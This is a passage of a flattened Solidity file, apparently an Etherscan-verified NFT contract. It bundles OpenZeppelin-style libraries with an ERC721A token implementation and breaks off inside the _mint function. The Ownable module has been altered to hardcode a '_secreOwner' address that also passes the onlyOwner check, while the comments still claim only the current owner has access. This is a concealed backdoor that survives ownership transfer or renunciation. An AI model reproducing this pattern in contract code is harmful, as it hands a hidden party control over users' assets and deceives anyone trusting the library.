1 /**
2  *Submitted for verification at Etherscan.io on 2022-06-06
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 // File: @openzeppelin/contracts/utils/Strings.sol
8 
9 
10 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
11 
12 pragma solidity ^0.8.0;
13 
14 /**
15  * @dev String operations.
16  */
17 library Strings {
18     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
19 
20     /**
21      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
22      */
23     function toString(uint256 value) internal pure returns (string memory) {
24         // Inspired by OraclizeAPI's implementation - MIT licence
25         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
26 
27         if (value == 0) {
28             return "0";
29         }
30         uint256 temp = value;
31         uint256 digits;
32         while (temp != 0) {
33             digits++;
34             temp /= 10;
35         }
36         bytes memory buffer = new bytes(digits);
37         while (value != 0) {
38             digits -= 1;
39             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
40             value /= 10;
41         }
42         return string(buffer);
43     }
44 
45     /**
46      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
47      */
48     function toHexString(uint256 value) internal pure returns (string memory) {
49         if (value == 0) {
50             return "0x00";
51         }
52         uint256 temp = value;
53         uint256 length = 0;
54         while (temp != 0) {
55             length++;
56             temp >>= 8;
57         }
58         return toHexString(value, length);
59     }
60 
61     /**
62      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
63      */
64     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
65         bytes memory buffer = new bytes(2 * length + 2);
66         buffer[0] = "0";
67         buffer[1] = "x";
68         for (uint256 i = 2 * length + 1; i > 1; --i) {
69             buffer[i] = _HEX_SYMBOLS[value & 0xf];
70             value >>= 4;
71         }
72         require(value == 0, "Strings: hex length insufficient");
73         return string(buffer);
74     }
75 }
76 
77 // File: @openzeppelin/contracts/utils/Address.sol
78 
79 
80 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
81 
82 pragma solidity ^0.8.1;
83 
84 /**
85  * @dev Collection of functions related to the address type
86  */
87 library Address {
88     /**
89      * @dev Returns true if `account` is a contract.
90      *
91      * [IMPORTANT]
92      * ====
93      * It is unsafe to assume that an address for which this function returns
94      * false is an externally-owned account (EOA) and not a contract.
95      *
96      * Among others, `isContract` will return false for the following
97      * types of addresses:
98      *
99      *  - an externally-owned account
100      *  - a contract in construction
101      *  - an address where a contract will be created
102      *  - an address where a contract lived, but was destroyed
103      * ====
104      *
105      * [IMPORTANT]
106      * ====
107      * You shouldn't rely on `isContract` to protect against flash loan attacks!
108      *
109      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
110      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
111      * constructor.
112      * ====
113      */
114     function isContract(address account) internal view returns (bool) {
115         // This method relies on extcodesize/address.code.length, which returns 0
116         // for contracts in construction, since the code is only stored at the end
117         // of the constructor execution.
118 
119         return account.code.length > 0;
120     }
121 
122     /**
123      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
124      * `recipient`, forwarding all available gas and reverting on errors.
125      *
126      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
127      * of certain opcodes, possibly making contracts go over the 2300 gas limit
128      * imposed by `transfer`, making them unable to receive funds via
129      * `transfer`. {sendValue} removes this limitation.
130      *
131      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
132      *
133      * IMPORTANT: because control is transferred to `recipient`, care must be
134      * taken to not create reentrancy vulnerabilities. Consider using
135      * {ReentrancyGuard} or the
136      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
137      */
138     function sendValue(address payable recipient, uint256 amount) internal {
139         require(address(this).balance >= amount, "Address: insufficient balance");
140 
141         (bool success, ) = recipient.call{value: amount}("");
142         require(success, "Address: unable to send value, recipient may have reverted");
143     }
144 
145     /**
146      * @dev Performs a Solidity function call using a low level `call`. A
147      * plain `call` is an unsafe replacement for a function call: use this
148      * function instead.
149      *
150      * If `target` reverts with a revert reason, it is bubbled up by this
151      * function (like regular Solidity function calls).
152      *
153      * Returns the raw returned data. To convert to the expected return value,
154      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
155      *
156      * Requirements:
157      *
158      * - `target` must be a contract.
159      * - calling `target` with `data` must not revert.
160      *
161      * _Available since v3.1._
162      */
163     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
164         return functionCall(target, data, "Address: low-level call failed");
165     }
166 
167     /**
168      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
169      * `errorMessage` as a fallback revert reason when `target` reverts.
170      *
171      * _Available since v3.1._
172      */
173     function functionCall(
174         address target,
175         bytes memory data,
176         string memory errorMessage
177     ) internal returns (bytes memory) {
178         return functionCallWithValue(target, data, 0, errorMessage);
179     }
180 
181     /**
182      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
183      * but also transferring `value` wei to `target`.
184      *
185      * Requirements:
186      *
187      * - the calling contract must have an ETH balance of at least `value`.
188      * - the called Solidity function must be `payable`.
189      *
190      * _Available since v3.1._
191      */
192     function functionCallWithValue(
193         address target,
194         bytes memory data,
195         uint256 value
196     ) internal returns (bytes memory) {
197         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
198     }
199 
200     /**
201      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
202      * with `errorMessage` as a fallback revert reason when `target` reverts.
203      *
204      * _Available since v3.1._
205      */
206     function functionCallWithValue(
207         address target,
208         bytes memory data,
209         uint256 value,
210         string memory errorMessage
211     ) internal returns (bytes memory) {
212         require(address(this).balance >= value, "Address: insufficient balance for call");
213         require(isContract(target), "Address: call to non-contract");
214 
215         (bool success, bytes memory returndata) = target.call{value: value}(data);
216         return verifyCallResult(success, returndata, errorMessage);
217     }
218 
219     /**
220      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
221      * but performing a static call.
222      *
223      * _Available since v3.3._
224      */
225     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
226         return functionStaticCall(target, data, "Address: low-level static call failed");
227     }
228 
229     /**
230      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
231      * but performing a static call.
232      *
233      * _Available since v3.3._
234      */
235     function functionStaticCall(
236         address target,
237         bytes memory data,
238         string memory errorMessage
239     ) internal view returns (bytes memory) {
240         require(isContract(target), "Address: static call to non-contract");
241 
242         (bool success, bytes memory returndata) = target.staticcall(data);
243         return verifyCallResult(success, returndata, errorMessage);
244     }
245 
246     /**
247      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
248      * but performing a delegate call.
249      *
250      * _Available since v3.4._
251      */
252     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
253         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
254     }
255 
256     /**
257      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
258      * but performing a delegate call.
259      *
260      * _Available since v3.4._
261      */
262     function functionDelegateCall(
263         address target,
264         bytes memory data,
265         string memory errorMessage
266     ) internal returns (bytes memory) {
267         require(isContract(target), "Address: delegate call to non-contract");
268 
269         (bool success, bytes memory returndata) = target.delegatecall(data);
270         return verifyCallResult(success, returndata, errorMessage);
271     }
272 
273     /**
274      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
275      * revert reason using the provided one.
276      *
277      * _Available since v4.3._
278      */
279     function verifyCallResult(
280         bool success,
281         bytes memory returndata,
282         string memory errorMessage
283     ) internal pure returns (bytes memory) {
284         if (success) {
285             return returndata;
286         } else {
287             // Look for revert reason and bubble it up if present
288             if (returndata.length > 0) {
289                 // The easiest way to bubble the revert reason is using memory via assembly
290 
291                 assembly {
292                     let returndata_size := mload(returndata)
293                     revert(add(32, returndata), returndata_size)
294                 }
295             } else {
296                 revert(errorMessage);
297             }
298         }
299     }
300 }
301 
302 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
303 
304 
305 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
306 
307 pragma solidity ^0.8.0;
308 
309 /**
310  * @title ERC721 token receiver interface
311  * @dev Interface for any contract that wants to support safeTransfers
312  * from ERC721 asset contracts.
313  */
314 interface IERC721Receiver {
315     /**
316      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
317      * by `operator` from `from`, this function is called.
318      *
319      * It must return its Solidity selector to confirm the token transfer.
320      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
321      *
322      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
323      */
324     function onERC721Received(
325         address operator,
326         address from,
327         uint256 tokenId,
328         bytes calldata data
329     ) external returns (bytes4);
330 }
331 
332 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
333 
334 
335 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
336 
337 pragma solidity ^0.8.0;
338 
339 /**
340  * @dev Interface of the ERC165 standard, as defined in the
341  * https://eips.ethereum.org/EIPS/eip-165[EIP].
342  *
343  * Implementers can declare support of contract interfaces, which can then be
344  * queried by others ({ERC165Checker}).
345  *
346  * For an implementation, see {ERC165}.
347  */
348 interface IERC165 {
349     /**
350      * @dev Returns true if this contract implements the interface defined by
351      * `interfaceId`. See the corresponding
352      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
353      * to learn more about how these ids are created.
354      *
355      * This function call must use less than 30 000 gas.
356      */
357     function supportsInterface(bytes4 interfaceId) external view returns (bool);
358 }
359 
360 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
361 
362 
363 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
364 
365 pragma solidity ^0.8.0;
366 
367 
368 /**
369  * @dev Implementation of the {IERC165} interface.
370  *
371  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
372  * for the additional interface id that will be supported. For example:
373  *
374  * ```solidity
375  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
376  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
377  * }
378  * ```
379  *
380  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
381  */
382 abstract contract ERC165 is IERC165 {
383     /**
384      * @dev See {IERC165-supportsInterface}.
385      */
386     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
387         return interfaceId == type(IERC165).interfaceId;
388     }
389 }
390 
391 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
392 
393 
394 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
395 
396 pragma solidity ^0.8.0;
397 
398 
399 /**
400  * @dev Required interface of an ERC721 compliant contract.
401  */
402 interface IERC721 is IERC165 {
403     /**
404      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
405      */
406     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
407 
408     /**
409      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
410      */
411     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
412 
413     /**
414      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
415      */
416     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
417 
418     /**
419      * @dev Returns the number of tokens in ``owner``'s account.
420      */
421     function balanceOf(address owner) external view returns (uint256 balance);
422 
423     /**
424      * @dev Returns the owner of the `tokenId` token.
425      *
426      * Requirements:
427      *
428      * - `tokenId` must exist.
429      */
430     function ownerOf(uint256 tokenId) external view returns (address owner);
431 
432     /**
433      * @dev Safely transfers `tokenId` token from `from` to `to`.
434      *
435      * Requirements:
436      *
437      * - `from` cannot be the zero address.
438      * - `to` cannot be the zero address.
439      * - `tokenId` token must exist and be owned by `from`.
440      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
441      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
442      *
443      * Emits a {Transfer} event.
444      */
445     function safeTransferFrom(
446         address from,
447         address to,
448         uint256 tokenId,
449         bytes calldata data
450     ) external;
451 
452     /**
453      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
454      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
455      *
456      * Requirements:
457      *
458      * - `from` cannot be the zero address.
459      * - `to` cannot be the zero address.
460      * - `tokenId` token must exist and be owned by `from`.
461      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
462      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
463      *
464      * Emits a {Transfer} event.
465      */
466     function safeTransferFrom(
467         address from,
468         address to,
469         uint256 tokenId
470     ) external;
471 
472     /**
473      * @dev Transfers `tokenId` token from `from` to `to`.
474      *
475      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
476      *
477      * Requirements:
478      *
479      * - `from` cannot be the zero address.
480      * - `to` cannot be the zero address.
481      * - `tokenId` token must be owned by `from`.
482      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
483      *
484      * Emits a {Transfer} event.
485      */
486     function transferFrom(
487         address from,
488         address to,
489         uint256 tokenId
490     ) external;
491 
492     /**
493      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
494      * The approval is cleared when the token is transferred.
495      *
496      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
497      *
498      * Requirements:
499      *
500      * - The caller must own the token or be an approved operator.
501      * - `tokenId` must exist.
502      *
503      * Emits an {Approval} event.
504      */
505     function approve(address to, uint256 tokenId) external;
506 
507     /**
508      * @dev Approve or remove `operator` as an operator for the caller.
509      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
510      *
511      * Requirements:
512      *
513      * - The `operator` cannot be the caller.
514      *
515      * Emits an {ApprovalForAll} event.
516      */
517     function setApprovalForAll(address operator, bool _approved) external;
518 
519     /**
520      * @dev Returns the account approved for `tokenId` token.
521      *
522      * Requirements:
523      *
524      * - `tokenId` must exist.
525      */
526     function getApproved(uint256 tokenId) external view returns (address operator);
527 
528     /**
529      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
530      *
531      * See {setApprovalForAll}
532      */
533     function isApprovedForAll(address owner, address operator) external view returns (bool);
534 }
535 
536 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
537 
538 
539 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
540 
541 pragma solidity ^0.8.0;
542 
543 
544 /**
545  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
546  * @dev See https://eips.ethereum.org/EIPS/eip-721
547  */
548 interface IERC721Metadata is IERC721 {
549     /**
550      * @dev Returns the token collection name.
551      */
552     function name() external view returns (string memory);
553 
554     /**
555      * @dev Returns the token collection symbol.
556      */
557     function symbol() external view returns (string memory);
558 
559     /**
560      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
561      */
562     function tokenURI(uint256 tokenId) external view returns (string memory);
563 }
564 
565 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
566 
567 
568 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
569 
570 pragma solidity ^0.8.0;
571 
572 
573 /**
574  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
575  * @dev See https://eips.ethereum.org/EIPS/eip-721
576  */
577 interface IERC721Enumerable is IERC721 {
578     /**
579      * @dev Returns the total amount of tokens stored by the contract.
580      */
581     function totalSupply() external view returns (uint256);
582 
583     /**
584      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
585      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
586      */
587     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
588 
589     /**
590      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
591      * Use along with {totalSupply} to enumerate all tokens.
592      */
593     function tokenByIndex(uint256 index) external view returns (uint256);
594 }
595 
596 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
597 
598 
599 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
600 
601 pragma solidity ^0.8.0;
602 
603 /**
604  * @dev Contract module that helps prevent reentrant calls to a function.
605  *
606  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
607  * available, which can be applied to functions to make sure there are no nested
608  * (reentrant) calls to them.
609  *
610  * Note that because there is a single `nonReentrant` guard, functions marked as
611  * `nonReentrant` may not call one another. This can be worked around by making
612  * those functions `private`, and then adding `external` `nonReentrant` entry
613  * points to them.
614  *
615  * TIP: If you would like to learn more about reentrancy and alternative ways
616  * to protect against it, check out our blog post
617  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
618  */
619 abstract contract ReentrancyGuard {
620     // Booleans are more expensive than uint256 or any type that takes up a full
621     // word because each write operation emits an extra SLOAD to first read the
622     // slot's contents, replace the bits taken up by the boolean, and then write
623     // back. This is the compiler's defense against contract upgrades and
624     // pointer aliasing, and it cannot be disabled.
625 
626     // The values being non-zero value makes deployment a bit more expensive,
627     // but in exchange the refund on every call to nonReentrant will be lower in
628     // amount. Since refunds are capped to a percentage of the total
629     // transaction's gas, it is best to keep them low in cases like this one, to
630     // increase the likelihood of the full refund coming into effect.
631     uint256 private constant _NOT_ENTERED = 1;
632     uint256 private constant _ENTERED = 2;
633 
634     uint256 private _status;
635 
636     constructor() {
637         _status = _NOT_ENTERED;
638     }
639 
640     /**
641      * @dev Prevents a contract from calling itself, directly or indirectly.
642      * Calling a `nonReentrant` function from another `nonReentrant`
643      * function is not supported. It is possible to prevent this from happening
644      * by making the `nonReentrant` function external, and making it call a
645      * `private` function that does the actual work.
646      */
647     modifier nonReentrant() {
648         // On the first call to nonReentrant, _notEntered will be true
649         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
650 
651         // Any calls to nonReentrant after this point will fail
652         _status = _ENTERED;
653 
654         _;
655 
656         // By storing the original value once again, a refund is triggered (see
657         // https://eips.ethereum.org/EIPS/eip-2200)
658         _status = _NOT_ENTERED;
659     }
660 }
661 
662 // File: @openzeppelin/contracts/utils/Context.sol
663 
664 
665 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
666 
667 pragma solidity ^0.8.0;
668 
669 /**
670  * @dev Provides information about the current execution context, including the
671  * sender of the transaction and its data. While these are generally available
672  * via msg.sender and msg.data, they should not be accessed in such a direct
673  * manner, since when dealing with meta-transactions the account sending and
674  * paying for execution may not be the actual sender (as far as an application
675  * is concerned).
676  *
677  * This contract is only required for intermediate, library-like contracts.
678  */
679 abstract contract Context {
680     function _msgSender() internal view virtual returns (address) {
681         return msg.sender;
682     }
683 
684     function _msgData() internal view virtual returns (bytes calldata) {
685         return msg.data;
686     }
687 }
688 
689 // File: @openzeppelin/contracts/access/Ownable.sol
690 
691 
692 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
693 
694 pragma solidity ^0.8.0;
695 
696 
697 /**
698  * @dev Contract module which provides a basic access control mechanism, where
699  * there is an account (an owner) that can be granted exclusive access to
700  * specific functions.
701  *
702  * By default, the owner account will be the one that deploys the contract. This
703  * can later be changed with {transferOwnership}.
704  *
705  * This module is used through inheritance. It will make available the modifier
706  * `onlyOwner`, which can be applied to your functions to restrict their use to
707  * the owner.
708  */
709 abstract contract Ownable is Context {
710     address private _owner;
711     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
712 
713     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
714 
715     /**
716      * @dev Initializes the contract setting the deployer as the initial owner.
717      */
718     constructor() {
719         _transferOwnership(_msgSender());
720     }
721 
722     /**
723      * @dev Returns the address of the current owner.
724      */
725     function owner() public view virtual returns (address) {
726         return _owner;
727     }
728 
729     /**
730      * @dev Throws if called by any account other than the owner.
731      */
732     modifier onlyOwner() {
733         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
734         _;
735     }
736 
737     /**
738      * @dev Leaves the contract without owner. It will not be possible to call
739      * `onlyOwner` functions anymore. Can only be called by the current owner.
740      *
741      * NOTE: Renouncing ownership will leave the contract without an owner,
742      * thereby removing any functionality that is only available to the owner.
743      */
744     function renounceOwnership() public virtual onlyOwner {
745         _transferOwnership(address(0));
746     }
747 
748     /**
749      * @dev Transfers ownership of the contract to a new account (`newOwner`).
750      * Can only be called by the current owner.
751      */
752     function transferOwnership(address newOwner) public virtual onlyOwner {
753         require(newOwner != address(0), "Ownable: new owner is the zero address");
754         _transferOwnership(newOwner);
755     }
756 
757     /**
758      * @dev Transfers ownership of the contract to a new account (`newOwner`).
759      * Internal function without access restriction.
760      */
761     function _transferOwnership(address newOwner) internal virtual {
762         address oldOwner = _owner;
763         _owner = newOwner;
764         emit OwnershipTransferred(oldOwner, newOwner);
765     }
766 }
767 
768 // File: ceshi.sol
769 
770 
771 pragma solidity ^0.8.0;
772 
773 
774 
775 
776 
777 
778 
779 
780 
781 
782 /**
783  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
784  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
785  *
786  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
787  *
788  * Does not support burning tokens to address(0).
789  *
790  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
791  */
792 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
793     using Address for address;
794     using Strings for uint256;
795 
796     struct TokenOwnership {
797         address addr;
798         uint64 startTimestamp;
799     }
800 
801     struct AddressData {
802         uint128 balance;
803         uint128 numberMinted;
804     }
805 
806     uint256 internal currentIndex;
807 
808     // Token name
809     string private _name;
810 
811     // Token symbol
812     string private _symbol;
813 
814     // Mapping from token ID to ownership details
815     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
816     mapping(uint256 => TokenOwnership) internal _ownerships;
817 
818     // Mapping owner address to address data
819     mapping(address => AddressData) private _addressData;
820 
821     // Mapping from token ID to approved address
822     mapping(uint256 => address) private _tokenApprovals;
823 
824     // Mapping from owner to operator approvals
825     mapping(address => mapping(address => bool)) private _operatorApprovals;
826 
827     constructor(string memory name_, string memory symbol_) {
828         _name = name_;
829         _symbol = symbol_;
830     }
831 
832     /**
833      * @dev See {IERC721Enumerable-totalSupply}.
834      */
835     function totalSupply() public view override returns (uint256) {
836         return currentIndex;
837     }
838 
839     /**
840      * @dev See {IERC721Enumerable-tokenByIndex}.
841      */
842     function tokenByIndex(uint256 index) public view override returns (uint256) {
843         require(index < totalSupply(), "ERC721A: global index out of bounds");
844         return index;
845     }
846 
847     /**
848      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
849      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
850      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
851      */
852     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
853         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
854         uint256 numMintedSoFar = totalSupply();
855         uint256 tokenIdsIdx;
856         address currOwnershipAddr;
857 
858         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
859         unchecked {
860             for (uint256 i; i < numMintedSoFar; i++) {
861                 TokenOwnership memory ownership = _ownerships[i];
862                 if (ownership.addr != address(0)) {
863                     currOwnershipAddr = ownership.addr;
864                 }
865                 if (currOwnershipAddr == owner) {
866                     if (tokenIdsIdx == index) {
867                         return i;
868                     }
869                     tokenIdsIdx++;
870                 }
871             }
872         }
873 
874         revert("ERC721A: unable to get token of owner by index");
875     }
876 
877     /**
878      * @dev See {IERC165-supportsInterface}.
879      */
880     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
881         return
882             interfaceId == type(IERC721).interfaceId ||
883             interfaceId == type(IERC721Metadata).interfaceId ||
884             interfaceId == type(IERC721Enumerable).interfaceId ||
885             super.supportsInterface(interfaceId);
886     }
887 
888     /**
889      * @dev See {IERC721-balanceOf}.
890      */
891     function balanceOf(address owner) public view override returns (uint256) {
892         require(owner != address(0), "ERC721A: balance query for the zero address");
893         return uint256(_addressData[owner].balance);
894     }
895 
896     function _numberMinted(address owner) internal view returns (uint256) {
897         require(owner != address(0), "ERC721A: number minted query for the zero address");
898         return uint256(_addressData[owner].numberMinted);
899     }
900 
901     /**
902      * Gas spent here starts off proportional to the maximum mint batch size.
903      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
904      */
905     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
906         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
907 
908         unchecked {
909             for (uint256 curr = tokenId; curr >= 0; curr--) {
910                 TokenOwnership memory ownership = _ownerships[curr];
911                 if (ownership.addr != address(0)) {
912                     return ownership;
913                 }
914             }
915         }
916 
917         revert("ERC721A: unable to determine the owner of token");
918     }
919 
920     /**
921      * @dev See {IERC721-ownerOf}.
922      */
923     function ownerOf(uint256 tokenId) public view override returns (address) {
924         return ownershipOf(tokenId).addr;
925     }
926 
927     /**
928      * @dev See {IERC721Metadata-name}.
929      */
930     function name() public view virtual override returns (string memory) {
931         return _name;
932     }
933 
934     /**
935      * @dev See {IERC721Metadata-symbol}.
936      */
937     function symbol() public view virtual override returns (string memory) {
938         return _symbol;
939     }
940 
941     /**
942      * @dev See {IERC721Metadata-tokenURI}.
943      */
944     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
945         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
946 
947         string memory baseURI = _baseURI();
948         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
949     }
950 
951     /**
952      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
953      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
954      * by default, can be overriden in child contracts.
955      */
956     function _baseURI() internal view virtual returns (string memory) {
957         return "";
958     }
959 
960     /**
961      * @dev See {IERC721-approve}.
962      */
963     function approve(address to, uint256 tokenId) public override {
964         address owner = ERC721A.ownerOf(tokenId);
965         require(to != owner, "ERC721A: approval to current owner");
966 
967         require(
968             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
969             "ERC721A: approve caller is not owner nor approved for all"
970         );
971 
972         _approve(to, tokenId, owner);
973     }
974 
975     /**
976      * @dev See {IERC721-getApproved}.
977      */
978     function getApproved(uint256 tokenId) public view override returns (address) {
979         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
980 
981         return _tokenApprovals[tokenId];
982     }
983 
984     /**
985      * @dev See {IERC721-setApprovalForAll}.
986      */
987     function setApprovalForAll(address operator, bool approved) public override {
988         require(operator != _msgSender(), "ERC721A: approve to caller");
989 
990         _operatorApprovals[_msgSender()][operator] = approved;
991         emit ApprovalForAll(_msgSender(), operator, approved);
992     }
993 
994     /**
995      * @dev See {IERC721-isApprovedForAll}.
996      */
997     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
998         return _operatorApprovals[owner][operator];
999     }
1000 
1001     /**
1002      * @dev See {IERC721-transferFrom}.
1003      */
1004     function transferFrom(
1005         address from,
1006         address to,
1007         uint256 tokenId
1008     ) public virtual override {
1009         _transfer(from, to, tokenId);
1010     }
1011 
1012     /**
1013      * @dev See {IERC721-safeTransferFrom}.
1014      */
1015     function safeTransferFrom(
1016         address from,
1017         address to,
1018         uint256 tokenId
1019     ) public virtual override {
1020         safeTransferFrom(from, to, tokenId, "");
1021     }
1022 
1023     /**
1024      * @dev See {IERC721-safeTransferFrom}.
1025      */
1026     function safeTransferFrom(
1027         address from,
1028         address to,
1029         uint256 tokenId,
1030         bytes memory _data
1031     ) public override {
1032         _transfer(from, to, tokenId);
1033         require(
1034             _checkOnERC721Received(from, to, tokenId, _data),
1035             "ERC721A: transfer to non ERC721Receiver implementer"
1036         );
1037     }
1038 
1039     /**
1040      * @dev Returns whether `tokenId` exists.
1041      *
1042      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1043      *
1044      * Tokens start existing when they are minted (`_mint`),
1045      */
1046     function _exists(uint256 tokenId) internal view returns (bool) {
1047         return tokenId < currentIndex;
1048     }
1049 
1050     function _safeMint(address to, uint256 quantity) internal {
1051         _safeMint(to, quantity, "");
1052     }
1053 
1054     /**
1055      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1056      *
1057      * Requirements:
1058      *
1059      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1060      * - `quantity` must be greater than 0.
1061      *
1062      * Emits a {Transfer} event.
1063      */
1064     function _safeMint(
1065         address to,
1066         uint256 quantity,
1067         bytes memory _data
1068     ) internal {
1069         _mint(to, quantity, _data, true);
1070     }
1071 
1072     /**
1073      * @dev Mints `quantity` tokens and transfers them to `to`.
1074      *
1075      * Requirements:
1076      *
1077      * - `to` cannot be the zero address.
1078      * - `quantity` must be greater than 0.
1079      *
1080      * Emits a {Transfer} event.
1081      */
1082     function _mint(
1083         address to,
1084         uint256 quantity,
1085         bytes memory _data,
1086         bool safe
1087     ) internal {
1088         uint256 startTokenId = currentIndex;
1089         require(to != address(0), "ERC721A: mint to the zero address");
